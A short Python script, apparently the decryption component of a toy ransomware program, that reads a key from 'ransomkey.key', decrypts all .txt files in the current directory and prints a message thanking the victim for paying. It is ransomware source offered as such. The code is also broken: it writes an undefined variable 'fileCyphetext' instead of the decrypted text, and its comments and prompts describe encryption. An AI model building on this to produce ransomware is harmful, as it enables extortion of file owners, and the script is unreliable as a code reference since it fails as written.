#!/usr/bin/env python3
import glob
from cryptography.fernet import Fernet

currDirFiles = glob.glob("*.txt")
print("Text files to encrypt:\n" + str(currDirFiles))

# Generate key and save to file
# key=Fernet.generate_key()
with open("ransomkey.key", "rb") as keyfile:
	key = keyfile.read()

# Decrypt every *.txt file

for file in currDirFiles:
	# decrypt  file content
	with open(file, "rb") as thefile:
		fileContent = thefile.read()
	Plaintext = Fernet(key).decrypt(fileContent)
	# write cyphertext to file
	with open(file, "wb") as thefile:
		thefile.write(fileCyphetext)

print("Thanks for the Money! Here is your original files!!!")
